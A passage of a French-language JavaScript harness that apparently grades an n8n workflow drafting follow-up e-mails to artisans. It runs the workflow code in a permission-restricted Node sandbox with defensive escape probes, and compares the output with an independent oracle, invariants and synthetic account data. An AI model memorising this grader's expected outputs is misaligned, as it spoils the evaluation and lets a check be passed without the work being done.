    if (r.violations.length) throw new Error(`${nom} : accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
    if (r.erreur) throw new Error(`${nom} : ${r.erreur}`)
    if (!Array.isArray(r.items)) throw new Error(`${nom} : sortie illisible`)
    return r.items
  }
  function passer(m) {
    const sorties = {}
    for (const [nom, code] of m.prealables) sorties[nom] = unNoeud(nom, code, '{}', [{}], m.jour)
    for (const [nom, lignes] of Object.entries(m.lectures)) sorties[nom] = lignes
    const sortiesTexte = JSON.stringify(sorties)
    let entree = [{}]
    const parNoeud = { 'Réglages du suivi': sorties['Réglages du suivi'] }
    for (const [nom, code] of m.etapes) { entree = unNoeud(nom, code, sortiesTexte, entree, m.jour); parNoeud[nom] = entree }
    return parNoeud
  }
  function sonder(m) {
    const r = {}
    const essai = (k, f) => { try { f(); r[k] = 'PERMIS' } catch (e) { r[k] = (e && e.code) || texte(e) } }
    essai('ecriture', () => fs.writeFileSync(chemin.join(os.tmpdir(), 'suivi-artisan-qa-sonde.txt'), 'x'))
    essai('lecture', () => fs.readFileSync(m.fichier))
    essai('processus', () => processus.spawnSync(process.execPath, ['-v']))
    essai('worker', () => new fils.Worker('1', { eval: true }))
    r.permission = typeof process.permission === 'object' && process.permission !== null
    r.fetch_enfant = typeof globalThis.fetch
    r.getBuiltinModule_enfant = typeof process.getBuiltinModule
    try { const s = reseau.connect({ port: 9, host: '127.0.0.1' }); s.on('error', () => {}); s.destroy(); r.reseau = 'PERMIS' } catch (e) { r.reseau = (e && e.code) || texte(e) }
    r.node = process.version
    return r
  }
  process.on('message', (m) => {
    let rep
    try {
      const valeur = m.type === 'passer' ? passer(m) : m.type === 'executer' ? executer(m.jsCode, JSON.stringify(m.sorties || {}), m.entree || [{}], m.jour) : m.type === 'sonde' ? sonder(m) : null
      rep = { id: m.id, ok: true, valeur }
    } catch (e) { rep = { id: m.id, ok: false, erreur: texte(e) } }
    process.send(rep)
  })
}
const CODE_ENFANT = '(' + enfant.toString() + ')()'
class BacASable {
  constructor() {
    const permission = process.allowedNodeEnvironmentFlags.has('--permission') ? '--permission' : '--experimental-permission'
    this.drapeaux = [permission, '--disallow-code-generation-from-strings']
    const env = {}
    if (process.env.SystemRoot) env.SystemRoot = process.env.SystemRoot
    this.p = spawn(process.execPath, [...this.drapeaux, '-e', CODE_ENFANT], { stdio: ['ignore', 'ignore', 'pipe', 'ipc'], env, serialization: 'json', windowsHide: true })
    this.attente = new Map(); this.n = 0; this.erreurs = ''
    this.p.stderr.on('data', (d) => { this.erreurs = (this.erreurs + d).slice(-2000) })
    this.p.on('message', (m) => { const a = this.attente.get(m.id); if (!a) return; this.attente.delete(m.id); if (m.ok) a.ok(m.valeur); else a.ko(new Error(m.erreur)) })
    this.p.on('exit', (code) => { this.arrete = true; for (const a of this.attente.values()) a.ko(new Error(`bac à sable arrêté (code ${code}) ${this.erreurs.slice(0, 300)}`)); this.attente.clear() })
  }
  demander(m) {
    if (this.arrete) return Promise.reject(new Error(`bac à sable arrêté ${this.erreurs.slice(0, 300)}`))
    return new Promise((ok, ko) => { const id = ++this.n; this.attente.set(id, { ok, ko }); this.p.send({ ...m, id }) })
  }
  fermer() { this.p.kill() }
}
const BAC = new BacASable()

async function executerNoeud(wf, nom, entree, sorties, jour) {
  const r = await BAC.demander({ type: 'executer', jsCode: codeDe(wf, nom), entree, sorties, jour })
  if (r.violations.length) throw new Error(`${nom} : accès refusé par le bac à sable (${[...new Set(r.violations)].join(', ')})`)
  if (r.erreur) throw new Error(`${nom} : ${r.erreur}`)
  return r.items
}
/** Un passage complet sur des lectures fictives (une table vide rend un élément vide, comme alwaysOutputData dans n8n). */
async function passer(wf, lectures, jour) {
  const sorties = {}
  for (const l of LECTURES) sorties[l.nom] = lectures[l.nom]?.length ? lectures[l.nom] : [{}]
  for (const k of Object.keys(lectures)) if (!LECTURES.some((l) => l.nom === k)) throw new Error(`donnée fictive pour un nœud absent : ${k}`)
  const parNoeud = await BAC.demander({ type: 'passer', jour, lectures: sorties, prealables: [['Réglages du suivi', codeDe(wf, 'Réglages du suivi')]],
    etapes: ETAPES_CODE.map((nom) => [nom, codeDe(wf, nom)]) })
  const sortie = parNoeud['Brouillons et bilan']
  if (!Array.isArray(sortie) || sortie.length !== 1) throw new Error('la sortie doit être un seul élément')
  return { sortie: sortie[0], parNoeud }
}

// ─── L'oracle : la règle du brief, écrite ICI sans lire le code du workflow ───────────────────────────────────────────────────
function compteSuivi(a) {
  if (a.est_demo !== false) return 'demo'
  if (a.is_founder !== false) return 'fondateur'
  if (a.suppression_demandee_le !== null) return 'suppression_demandee'
  if (!R.offres_suivies.includes(a.plan)) return 'hors_offre'
  const n = a.notifications
  if (n !== null && n !== undefined && (typeof n !== 'object' || Array.isArray(n) || n.suivi === false)) return 'opposition_suivi'
  return null
}
function evenementsDe(lectures, artisanId) {
  const l = []
  for (const d of lectures['Lire demandes'] ?? []) if (d.artisan_id === artisanId && typeof d.id === 'string' && d.canal !== CANAL_IMPORT && jourParis(d.created_at)) l.push({ type: 'demandes_recues', ordre: 0, variante: 'premiere_demande', ev: { table: 'leads', id: d.id, colonne: 'created_at', date: d.created_at } })
  for (const d of lectures['Lire devis'] ?? []) if (d.artisan_id === artisanId && typeof d.id === 'string') {
    if (d.envoye_le && jourParis(d.envoye_le)) l.push({ type: 'devis_envoyes', ordre: 1, variante: 'premier_devis_envoye', ev: { table: 'devis', id: d.id, colonne: 'envoye_le', date: d.envoye_le } })
    if (d.accepte_le && jourParis(d.accepte_le)) l.push({ type: 'devis_acceptes', ordre: 2, variante: 'premier_devis_accepte', ev: { table: 'devis', id: d.id, colonne: 'accepte_le', date: d.accepte_le } })
  }
  for (const f of lectures['Lire factures'] ?? []) if (f.artisan_id === artisanId && typeof f.id === 'string' && f.emise_le && ['emise', 'payee'].includes(f.statut) && f.avoir_de === null && jourParis(f.emise_le))
    l.push({ type: 'factures_emises', ordre: 3, variante: 'premiere_facture', ev: { table: 'factures', id: f.id, colonne: 'emise_le', date: f.emise_le } })
  return l
}
function oracle(lectures, jour) {
  const ecartes = {}
  const ecarter = (m) => { ecartes[m] = (ecartes[m] || 0) + 1 }
  const silencieux = { premiers_pas: 0, bilan_j14: 0, bilan_j30: 0 }
  const candidats = []
  const vus = new Set()
  for (const a of lectures['Lire comptes'] ?? []) {
    if (typeof a.id !== 'string' || vus.has(a.id)) continue
    vus.add(a.id)
    const motif = compteSuivi(a)
    if (motif) { ecarter(motif); continue }
    const inscription = jourParis(a.created_at)
    const age = inscription ? ecartJours(jour, inscription) : -1
    if (!inscription || age < 0) { ecarter('inscription_illisible'); continue }
    const evs = evenementsDe(lectures, a.id).map((x) => ({ ...x, d: ecartJours(jourParis(x.ev.date), inscription) })).filter((x) => x.d >= 0 && x.d <= age)
    for (const [etape, f] of Object.entries(R.etapes)) {
      if (age < f.du || age > f.au) continue
      if (etape === 'premiers_pas') {
        const r = evs.filter((x) => x.d <= f.evenements_jusqu_a).sort((p, q) => Date.parse(p.ev.date) - Date.parse(q.ev.date) || p.ordre - q.ordre || (p.ev.id < q.ev.id ? -1 : p.ev.id > q.ev.id ? 1 : 0))
        if (!r.length) { silencieux[etape]++; continue }
        candidats.push({ cle: `suivi:${a.id}:${etape}`, artisan_id: a.id, etape, variante: r[0].variante, champs: {}, evenements: [r[0].ev], reste: f.au - age, inscription })
      } else {
        if (!evs.length) { silencieux[etape]++; continue }
        const champs = Object.fromEntries(CHAMPS[etape].map((c) => [c, evs.filter((x) => x.type === c).length]))
        candidats.push({ cle: `suivi:${a.id}:${etape}`, artisan_id: a.id, etape, variante: 'comptes', champs, evenements: evs.map((x) => x.ev), reste: f.au - age, inscription })
      }
    }
  }
  const registre = (lectures['Lire registre du suivi'] ?? []).filter((r) => r && Object.keys(r).length)
  const cles = new Set(registre.map((r) => r.cle))
  const dernier = new Map()
  for (const r of registre) { if (typeof r.artisan_id !== 'string') continue; const j = jourParis(r.envoye_le) || jour; if (!dernier.has(r.artisan_id) || j > dernier.get(r.artisan_id)) dernier.set(r.artisan_id, j) }
  candidats.sort((p, q) => p.reste - q.reste || (p.inscription < q.inscription ? -1 : p.inscription > q.inscription ? 1 : 0) || (p.artisan_id < q.artisan_id ? -1 : p.artisan_id > q.artisan_id ? 1 : 0) || (p.cle < q.cle ? -1 : 1))
  const brouillons = [], reportes = [], servis = new Set()
  for (const c of candidats) {
    if (cles.has(c.cle)) { ecarter('deja_au_registre'); continue }
    const d = dernier.get(c.artisan_id)
    if (d !== undefined && ecartJours(jour, d) < R.ecart_min_jours) { ecarter('ecart_5_jours'); continue }
    if (servis.has(c.artisan_id)) { ecarter('un_par_passage'); continue }
    servis.add(c.artisan_id)
    if (brouillons.length >= R.plafond_par_passage) { reportes.push(c); continue }
    brouillons.push({ cle: c.cle, artisan_id: c.artisan_id, etape: c.etape, variante: c.variante, champs: c.champs, evenements: c.evenements })
  }
  const par_etape = Object.fromEntries(Object.keys(R.etapes).map((e) => [e, { brouillons: brouillons.filter((b) => b.etape === e).length, reportes: reportes.filter((b) => b.etape === e).length, silencieux: silencieux[e] }]))
  return { mode: R.mode, mention_ia: R.mention_ia, jour, bilan: { par_etape, ecartes, reportes: reportes.map((r) => r.cle) }, brouillons }
}
const normaliser = (s) => ({ ...s, brouillons: [...(s.brouillons ?? [])].map((b) => ({ ...b, evenements: [...(b.evenements ?? [])].sort((p, q) => JSON.stringify(p) < JSON.stringify(q) ? -1 : 1) })).sort((p, q) => (p.cle < q.cle ? -1 : 1)),
  bilan: { ...(s.bilan ?? {}), reportes: [...(s.bilan?.reportes ?? [])].sort() } })

/** Les invariants, sur la sortie d'un passage, contre les lignes lues. Indépendants de l'oracle : chacun dit sa raison. */
function invariants(titre, lectures, jour, s) {
  const e = []
  const ko = (m) => e.push(`${titre} : ${m}`)
  if (s.mode !== 'brouillon') ko(`mode « ${s.mode} » (brouillon attendu : rien ne part)`)
  if (s.mention_ia !== 'non_vise') ko('mention_ia : non_vise attendu (message de Presti)')
  if (s.jour !== jour) ko(`jour ${s.jour} (attendu ${jour})`)
  const comptes = new Map((lectures['Lire comptes'] ?? []).map((a) => [a.id, a]))
  const registre = (lectures['Lire registre du suivi'] ?? []).filter((r) => r && Object.keys(r).length)
  const cles = new Set(), artisans = new Set()
  for (const b of s.brouillons ?? []) {
    const k = Object.keys(b).sort()
    if (!memeValeur(k, CLES_BROUILLON)) ko(`brouillon aux clés ${k.join(',')} (liste blanche : ${CLES_BROUILLON.join(',')})`)
    if (b.cle !== `suivi:${b.artisan_id}:${b.etape}`) ko(`clé ${b.cle} mal formée`)
    if (cles.has(b.cle)) ko(`clé ${b.cle} en double dans un passage`)
    if (artisans.has(b.artisan_id)) ko(`deux brouillons au même artisan dans un passage (${b.artisan_id})`)
    cles.add(b.cle); artisans.add(b.artisan_id)
    const f = R.etapes[b.etape]
    if (!f) { ko(`étape inconnue ${b.etape}`); continue }
    if (!VARIANTES[b.etape].includes(b.variante)) ko(`variante ${b.variante} inconnue pour ${b.etape}`)
    if (!memeValeur(Object.keys(b.champs ?? {}).sort(), [...CHAMPS[b.etape]].sort())) ko(`${b.cle} : champs ${Object.keys(b.champs ?? {}).join(',')} (attendus ${CHAMPS[b.etape].join(',') || 'aucun'})`)
    const a = comptes.get(b.artisan_id)
    if (!a) { ko(`${b.cle} : artisan absent des comptes lus`); continue }
    const motif = compteSuivi(a)
    if (motif) ko(`${b.cle} : brouillon pour un compte écarté (${motif}) — jamais un compte de démo, de fondateur, en suppression ou opposé`)
    const inscription = jourParis(a.created_at)
    const age = ecartJours(jour, inscription)
    if (age < f.du || age > f.au) ko(`${b.cle} : hors de la fenêtre de son étape (J+${age}, fenêtre J+${f.du} à J+${f.au})`)
    if (registre.some((r) => r.cle === b.cle)) ko(`${b.cle} : clé déjà au registre, elle revient`)
    for (const r of registre) if (r.artisan_id === b.artisan_id && ecartJours(jour, jourParis(r.envoye_le) || jour) < R.ecart_min_jours) ko(`${b.cle} : un e-mail du suivi à cet artisan il y a moins de ${R.ecart_min_jours} jours`)
    if (!Array.isArray(b.evenements) || !b.evenements.length) { ko(`${b.cle} : brouillon sans événement réel`); continue }
    const compte = Object.fromEntries(CHAMPS[b.etape].map((c) => [c, 0]))
    for (const ev of b.evenements) {
      if (!memeValeur(Object.keys(ev).sort(), CLES_EVENEMENT)) { ko(`${b.cle} : événement aux clés ${Object.keys(ev).join(',')}`); continue }
      const nomNoeud = NOEUD_DE_TABLE[ev.table]
      if (!nomNoeud || !DATES_EVENEMENT[ev.table].includes(ev.colonne)) { ko(`${b.cle} : événement ${ev.table}.${ev.colonne} non permis`); continue }
      const ligne = (lectures[nomNoeud] ?? []).find((l) => l.id === ev.id)
      if (!ligne) { ko(`${b.cle} : événement inventé (${ev.table} ${ev.id} absent des données lues)`); continue }
      if (ligne.artisan_id !== b.artisan_id) ko(`${b.cle} : événement d'un autre artisan (${ev.id})`)
      if (ligne[ev.colonne] !== ev.date) ko(`${b.cle} : date ${ev.date} différente de la ligne lue (${ligne[ev.colonne]})`)
      if (ev.table === 'leads' && ligne.canal === CANAL_IMPORT) ko(`${b.cle} : une demande importée comptée comme reçue`)
      if (ev.table === 'factures' && (ligne.avoir_de !== null || !['emise', 'payee'].includes(ligne.statut))) ko(`${b.cle} : un avoir ou une facture annulée compté comme facture émise`)
      const d = ecartJours(jourParis(ev.date), inscription)
      const max = b.etape === 'premiers_pas' ? Math.min(f.evenements_jusqu_a, age) : age
      if (d < 0 || d > max) ko(`${b.cle} : événement hors de la fenêtre de l'étape (J+${d})`)
      const type = ev.table === 'leads' ? 'demandes_recues' : ev.table === 'factures' ? 'factures_emises' : ev.colonne === 'envoye_le' ? 'devis_envoyes' : 'devis_acceptes'
      if (type in compte) compte[type]++
    }
    if (b.etape !== 'premiers_pas') {
      // Chaque nombre recompté ICI, depuis les mêmes lignes (et pas seulement depuis les événements cités).
      const evs = evenementsDe(lectures, b.artisan_id).filter((x) => { const d = ecartJours(jourParis(x.ev.date), inscription); return d >= 0 && d <= age })
      for (const c of CHAMPS[b.etape]) {
        const n = evs.filter((x) => x.type === c).length
        if (b.champs?.[c] !== n) ko(`${b.cle} : ${c} = ${b.champs?.[c]}, recompté ${n}`)
        if (compte[c] !== b.champs?.[c]) ko(`${b.cle} : ${c} = ${b.champs?.[c]} mais ${compte[c]} événement(s) cité(s)`)
      }
    } else if (b.evenements.length !== 1) ko(`${b.cle} : les premiers pas citent une seule réussite, la première`)
  }
  if ((s.brouillons ?? []).length > R.plafond_par_passage) ko(`${s.brouillons.length} brouillons pour un plafond de ${R.plafond_par_passage}`)
  return e
}
async function cas(wf, titre, lectures, jour) {
  const { sortie } = await passer(wf, lectures, jour)
  const e = invariants(titre, lectures, jour, sortie)
  const attendu = oracle(lectures, jour)
  if (!memeValeur(normaliser(sortie), normaliser(attendu))) e.push(`${titre} : sortie différente de la règle du brief — n8n ${JSON.stringify(trier(normaliser(sortie))).slice(0, 400)} ; attendu ${JSON.stringify(trier(normaliser(attendu))).slice(0, 400)}`)
  return { sortie, e }
}

// ─── Données fictives : identifiants inventés, aucun nom, aucune adresse ──────────────────────────────────────────────────────
const u = (n) => '00000000-0000-4000-8000-' + String(n).padStart(12, '0')
const compte = (n, plan, created_at, extra = {}) => ({ id: u(n), plan, created_at, is_founder: false, est_demo: false, suppression_demandee_le: null, notifications: {}, ...extra })
const vide = () => ({ 'Lire comptes': [], 'Lire demandes': [], 'Lire devis': [], 'Lire factures': [], 'Lire registre du suivi': [] })
const a10h = (j) => j + 'T09:00:00+00:00'
const envoyer = (lectures, sortie, jour) => { for (const b of sortie.brouillons) lectures['Lire registre du suivi'].push({ cle: b.cle, artisan_id: b.artisan_id, etape: b.etape, envoye_le: a10h(jour) }) }

/** Une famille de comptes qui a de tout, inscrits le même jour J0. */
function famille(j0) {
  const L = vide()
  const plein = (n, extra = {}) => {
    L['Lire comptes'].push(compte(n, 'studio', a10h(j0), extra))
    L['Lire demandes'].push({ id: u(1000 + n), artisan_id: u(n), canal: 'formulaire', created_at: decaler(j0, 1) + 'T14:00:00+00:00' })
    L['Lire devis'].push({ id: u(2000 + n), artisan_id: u(n), envoye_le: decaler(j0, 3) + 'T10:00:00+00:00', accepte_le: decaler(j0, 9) + 'T10:00:00+00:00' })
    L['Lire factures'].push({ id: u(3000 + n), artisan_id: u(n), statut: 'emise', emise_le: decaler(j0, 20) + 'T10:00:00+00:00', avoir_de: null })
  }
  plein(1)                                                    // tout : premiers pas, J+14 et J+30
  plein(2, { est_demo: true })                                // démo
  plein(3, { is_founder: true })                              // fondateur
  plein(4, { suppression_demandee_le: a10h(j0) })             // suppression demandée
  plein(5, { notifications: { suivi: false } })               // opposé au suivi
  plein(6, { notifications: { suivi: true, devis_accepte: false } }) // suivi coché : suivi
  plein(7, { plan: 'signature' })
  L['Lire comptes'].push(compte(8, 'signature', a10h(j0)))    // inscription seule
  L['Lire comptes'].push(compte(9, 'studio', a10h(j0)))       // demande importée seule
  L['Lire demandes'].push({ id: u(1009), artisan_id: u(9), canal: CANAL_IMPORT, created_at: decaler(j0, 1) + 'T10:00:00+00:00' })
  L['Lire comptes'].push(compte(10, 'studio', a10h(j0)))      // un avoir et une facture annulée seulement
  L['Lire factures'].push({ id: u(3010), artisan_id: u(10), statut: 'emise', emise_le: decaler(j0, 1) + 'T10:00:00+00:00', avoir_de: u(3001) })
  L['Lire factures'].push({ id: u(3011), artisan_id: u(10), statut: 'annulee', emise_le: decaler(j0, 1) + 'T11:00:00+00:00', avoir_de: null })
  L['Lire comptes'].push(compte(11, 'gratuit', a10h(j0)))     // hors offre
  L['Lire demandes'].push({ id: u(1011), artisan_id: u(11), canal: 'formulaire', created_at: decaler(j0, 1) + 'T10:00:00+00:00' })
  return L
}
// Générateur pseudo-aléatoire déterministe (aucun hasard d'une exécution à l'autre).
function lcg(graine) { let x = graine >>> 0; return () => { x = (Math.imul(x, 1664525) + 1013904223) >>> 0; return x / 2 ** 32 } }
function hasard(graine, jour) {
  const r = lcg(graine), L = vide(), heures = ['T06:30:00+00:00', 'T11:00:00+00:00', 'T22:30:00+00:00', 'T23:45:00+00:00']
  const pick = (l) => l[Math.floor(r() * l.length)]
  for (let i = 1; i <= 14; i++) {
    const age = Math.floor(r() * 36)
    const j0 = decaler(jour, -age)
    const extra = r() < 0.15 ? pick([{ est_demo: true }, { is_founder: true }, { suppression_demandee_le: a10h(j0) }, { notifications: { suivi: false } }, { notifications: null }, { plan: 'gratuit' }]) : {}
    L['Lire comptes'].push(compte(i, pick(['studio', 'signature', 'entreprise']), j0 + pick(heures), extra))
    const n = Math.floor(r() * 4)
    for (let k = 0; k < n; k++) {
      const d = decaler(j0, Math.floor(r() * (age + 3)) - 1) + pick(heures)
      const t = r()
      const id = u(i * 100 + k)
      if (t < 0.4) L['Lire demandes'].push({ id, artisan_id: u(i), canal: r() < 0.25 ? CANAL_IMPORT : 'formulaire', created_at: d })
      else if (t < 0.75) L['Lire devis'].push({ id, artisan_id: u(i), envoye_le: d, accepte_le: r() < 0.4 ? decaler(d.slice(0, 10), 1) + 'T09:00:00+00:00' : null })
      else L['Lire factures'].push({ id, artisan_id: u(i), statut: pick(['emise', 'payee', 'annulee']), emise_le: d, avoir_de: r() < 0.2 ? u(9999) : null })
    }
    if (r() < 0.25) L['Lire registre du suivi'].push({ cle: `suivi:${u(i)}:${pick(['premiers_pas', 'bilan_j14', 'bilan_j30'])}`, artisan_id: u(i), etape: 'premiers_pas', envoye_le: a10h(decaler(jour, -Math.floor(r() * 8))) })
  }
  return L
}

async function rejeu(wf) {
  const e = []
  const ajouter = (r) => { e.push(...r.e); return r.sortie }
  // a. Réglages du suivi (le workflow), comparés aux réglages du juge.
  try {
    const g = (await executerNoeud(wf, 'Réglages du suivi', [{}], {}, '2026-11-10'))[0]
    if (g.jour !== '2026-11-10') e.push('Réglages du suivi : jour de Paris non repris')
    for (const k of ['mode', 'mention_ia', 'offres_suivies', 'etapes', 'ecart_min_jours', 'plafond_par_passage']) if (!memeValeur(g[k], R[k])) e.push(`Réglages du suivi : ${k} = ${JSON.stringify(g[k])} (attendu ${JSON.stringify(R[k])})`)
    if (!(typeof g.inscrits_depuis === 'string' && ecartJours('2026-11-10', g.inscrits_depuis) >= R.etapes.bilan_j30.au + 1)) e.push(`Réglages du suivi : inscrits_depuis ${g.inscrits_depuis} ne couvre pas la dernière fenêtre`)
    if (Object.keys(g).some((k) => !['jour', 'inscrits_depuis', ...Object.keys(R)].includes(k))) e.push('Réglages du suivi : réglage inattendu')
  } catch (err) { return [`Réglages du suivi : ${err.message}`] }
  // b. Chaque jour de J−1 à J+40 pour la famille, sans registre : chaque étape à son jour pile, muette la veille et après sa fenêtre.
  const j0 = '2026-10-01'
  for (let age = -1; age <= 40; age++) {
    const jour = decaler(j0, age)
    const s = ajouter(await cas(wf, `famille J+${age}`, famille(j0), jour))
    const etapes = new Set(s.brouillons.filter((b) => b.artisan_id === u(1)).map((b) => b.etape))
    const attendue = age >= 1 && age <= 3 ? 'premiers_pas' : age >= 14 && age <= 16 ? 'bilan_j14' : age >= 30 && age <= 32 ? 'bilan_j30' : null
    if (attendue ? !(etapes.size === 1 && etapes.has(attendue)) : etapes.size) e.push(`famille J+${age} : étapes ${[...etapes].join(',') || 'aucune'} (attendu ${attendue ?? 'aucune'})`)
    for (const b of s.brouillons) if ([u(2), u(3), u(4), u(5), u(8), u(9), u(10), u(11)].includes(b.artisan_id)) e.push(`famille J+${age} : brouillon pour ${b.artisan_id}, qui ne doit rien recevoir`)
    if (age === 1 && s.brouillons.find((b) => b.artisan_id === u(1))?.variante !== 'premiere_demande') e.push('famille J+1 : la première réussite (la demande) attendue')
    if (age === 14) { const b = s.brouillons.find((x) => x.artisan_id === u(1)); if (!b || !memeValeur(b.champs, { demandes_recues: 1, devis_envoyes: 1, devis_acceptes: 1, factures_emises: 0 })) e.push(`famille J+14 : comptes ${JSON.stringify(b?.champs)}`) }
    if (age === 30) { const b = s.brouillons.find((x) => x.artisan_id === u(1)); if (!b || b.champs.factures_emises !== 1) e.push(`famille J+30 : comptes ${JSON.stringify(b?.champs)}`) }
  }
  // c. Quarante et un jours d'affilée, le registre mis à jour après chaque passage comme après un envoi : une fois par étape et par
  //    artisan, jamais à moins de cinq jours ; deux passages le même jour n'ajoutent rien.
  {
    const L = famille(j0)
    const recus = new Map()
    for (let age = 0; age <= 40; age++) {
      const jour = decaler(j0, age)
      const s = ajouter(await cas(wf, `suite J+${age}`, L, jour))
      envoyer(L, s, jour)
      for (const b of s.brouillons) { const l = recus.get(b.artisan_id) ?? []; l.push({ etape: b.etape, jour }); recus.set(b.artisan_id, l) }
      const encore = ajouter(await cas(wf, `suite J+${age}, second passage du jour`, L, jour))
      if (encore.brouillons.length) e.push(`suite J+${age} : un second passage le même jour rend ${encore.brouillons.length} brouillon(s)`)
    }
    for (const [artisan, l] of recus) {
      const etapes = l.map((x) => x.etape)
      if (new Set(etapes).size !== etapes.length) e.push(`suite : ${artisan} reçoit deux fois la même étape (${etapes.join(',')})`)
      for (let i = 1; i < l.length; i++) if (ecartJours(l[i].jour, l[i - 1].jour) < R.ecart_min_jours) e.push(`suite : ${artisan} reçoit deux e-mails à moins de ${R.ecart_min_jours} jours`)
    }
    for (const n of [1, 6, 7]) if ((recus.get(u(n)) ?? []).map((x) => x.etape).join(',') !== 'premiers_pas,bilan_j14,bilan_j30') e.push(`suite : ${u(n)} reçoit ${(recus.get(u(n)) ?? []).map((x) => x.etape).join(',') || 'rien'} (attendu les trois étapes)`)
    for (const n of [2, 3, 4, 5, 8, 9, 10, 11]) if (recus.has(u(n))) e.push(`suite : ${u(n)} reçoit un e-mail du suivi`)
  }
  // d. Registre : clé présente ; envoi il y a 4 jours (écarté) puis 5 jours (permis) ; date illisible (refus par défaut).
  for (const [titre, registre, attendu] of [
    ['registre : clé présente', [{ cle: `suivi:${u(1)}:bilan_j14`, artisan_id: u(1), etape: 'bilan_j14', envoye_le: a10h('2026-10-02') }], 0],
    ['registre : envoi il y a 4 jours', [{ cle: `suivi:${u(1)}:premiers_pas`, artisan_id: u(1), etape: 'premiers_pas', envoye_le: a10h('2026-10-11') }], 0],
    ['registre : envoi il y a 5 jours', [{ cle: `suivi:${u(1)}:premiers_pas`, artisan_id: u(1), etape: 'premiers_pas', envoye_le: a10h('2026-10-10') }], 1],
    ['registre : date illisible', [{ cle: `suivi:${u(1)}:premiers_pas`, artisan_id: u(1), etape: 'premiers_pas', envoye_le: 'pas une date' }], 0],
  ]) {
    const L = vide()
    L['Lire comptes'].push(compte(1, 'studio', a10h('2026-10-01')))
    L['Lire demandes'].push({ id: u(1001), artisan_id: u(1), canal: 'formulaire', created_at: a10h('2026-10-02') })
    L['Lire registre du suivi'].push(...registre)
    const s = ajouter(await cas(wf, titre, L, '2026-10-15'))
    if (s.brouillons.length !== attendu) e.push(`${titre} : ${s.brouillons.length} brouillon(s), ${attendu} attendu`)
  }
  // e. Plafond : douze comptes au même jour J+14 ; dix brouillons, deux reportés ; le lendemain, les deux reportés passent, rien n'est perdu.
  {
    const L = vide()
    for (let i = 1; i <= 12; i++) { L['Lire comptes'].push(compte(i, 'studio', `2026-10-01T0${i % 10}:00:00+00:00`)); L['Lire demandes'].push({ id: u(1000 + i), artisan_id: u(i), canal: 'formulaire', created_at: a10h('2026-10-05') }) }
    const s1 = ajouter(await cas(wf, 'plafond, premier jour', L, '2026-10-15'))
    if (s1.brouillons.length !== R.plafond_par_passage || s1.bilan.reportes.length !== 12 - R.plafond_par_passage) e.push(`plafond : ${s1.brouillons.length} brouillons et ${s1.bilan.reportes.length} reportés (attendu ${R.plafond_par_passage} et ${12 - R.plafond_par_passage})`)
    envoyer(L, s1, '2026-10-15')
    const s2 = ajouter(await cas(wf, 'plafond, lendemain', L, '2026-10-16'))
    const servis = new Set([...s1.brouillons, ...s2.brouillons].map((b) => b.cle))
    if (servis.size !== 12) e.push(`plafond : ${12 - servis.size} brouillon(s) perdu(s) après le report`)
    if (!s1.bilan.reportes.every((c) => s2.brouillons.some((b) => b.cle === c))) e.push('plafond : un reporté ne revient pas en tête du passage suivant')
  }
  // f. Jour de Paris, pas d'UTC : inscrit le 18/10 à 22 h 30 UTC = le 19/10 à 0 h 30 à Paris ; le 01/11, c'est J+13 : rien.
  {
    const L = vide()
    L['Lire comptes'].push(compte(1, 'studio', '2026-10-18T22:30:00+00:00'))
    L['Lire demandes'].push({ id: u(1001), artisan_id: u(1), canal: 'formulaire', created_at: '2026-10-20T10:00:00+00:00' })
    const s13 = ajouter(await cas(wf, 'jour de Paris, J+13', L, '2026-11-01'))
    if (s13.brouillons.length) e.push('jour de Paris : un bilan J+14 sort à J+13 (jour compté en UTC ?)')
    const s14 = ajouter(await cas(wf, 'jour de Paris, J+14', L, '2026-11-02'))
    if (s14.brouillons.length !== 1) e.push('jour de Paris : le bilan J+14 ne sort pas à J+14')
  }
  // g. Premiers pas : la PREMIÈRE réussite (un devis envoyé avant la demande).
  {
    const L = vide()
    L['Lire comptes'].push(compte(1, 'studio', a10h('2026-10-01')))
    L['Lire demandes'].push({ id: u(1001), artisan_id: u(1), canal: 'formulaire', created_at: '2026-10-02T15:00:00+00:00' })
    L['Lire devis'].push({ id: u(2001), artisan_id: u(1), envoye_le: '2026-10-02T08:00:00+00:00', accepte_le: null })
    const s = ajouter(await cas(wf, 'premiers pas : première réussite', L, '2026-10-03'))
    if (s.brouillons[0]?.variante !== 'premier_devis_envoye') e.push(`premiers pas : variante ${s.brouillons[0]?.variante} (la première réussite est le devis envoyé)`)
  }
  // h. La garde seule, sur des candidats fabriqués : deux étapes pour un même artisan, une clé en double → un seul brouillon.
  {
    const R0 = (await executerNoeud(wf, 'Réglages du suivi', [{}], {}, '2026-10-15'))[0]
    const c = (etape, reste) => ({ cle: `suivi:${u(1)}:${etape}`, artisan_id: u(1), etape, variante: etape === 'premiers_pas' ? 'premiere_demande' : 'comptes', champs: {}, evenements: [{ table: 'leads', id: u(1001), colonne: 'created_at', date: a10h('2026-10-02') }], reste, inscription: '2026-10-01' })
    const g = (await executerNoeud(wf, 'Garde du suivi', [{ comptes: [], ecartes: {}, candidats: [c('bilan_j14', 1), c('bilan_j14', 1), c('premiers_pas', 0)], silencieux: {} }],
      { 'Réglages du suivi': [R0], 'Lire registre du suivi': [{}] }, '2026-10-15'))[0]
    if (g.brouillons.length !== 1 || g.ecartes.un_par_passage !== 2) e.push(`garde : ${g.brouillons.length} brouillon(s) pour un artisan à trois candidats (un seul attendu, deux « un_par_passage »)`)
  }
  // i. Propriété : 40 jeux tirés au hasard (déterministe), chacun jugé par les invariants et l'oracle.
  for (let k = 1; k <= 40; k++) ajouter(await cas(wf, `hasard ${k}`, hasard(k * 7919, decaler('2026-10-20', k % 9)), decaler('2026-10-20', k % 9)))
  return e
}

// ─── 6. L'essai n8n, rejoué ───────────────────────────────────────────────────────────────────────────────────────────────────
async function essaiRejoue(wf, essai) {
  const e = []
  if (essai.workflowId !== wf.id) e.push(`essai : workflow ${essai.workflowId} (attendu ${wf.id})`)
  if (essai.statut !== 'success' || essai.mode !== 'manual') e.push(`essai : statut ${essai.statut}, mode ${essai.mode}`)
  for (const nom of ['Déclencheur 10 h', ...LECTURES.map((l) => l.nom)]) if (!Array.isArray(essai.pinData?.[nom])) e.push(`essai : ${nom} n'est pas épinglé (aucune lecture réelle n'est permise)`)
  for (const k of Object.keys(essai.pinData ?? {})) if (!noeud(wf, k)) e.push(`essai : pin data d'un nœud absent (${k})`)
  const lectures = Object.fromEntries(LECTURES.map((l) => [l.nom, (essai.pinData?.[l.nom] ?? []).map((i) => i.json)]))
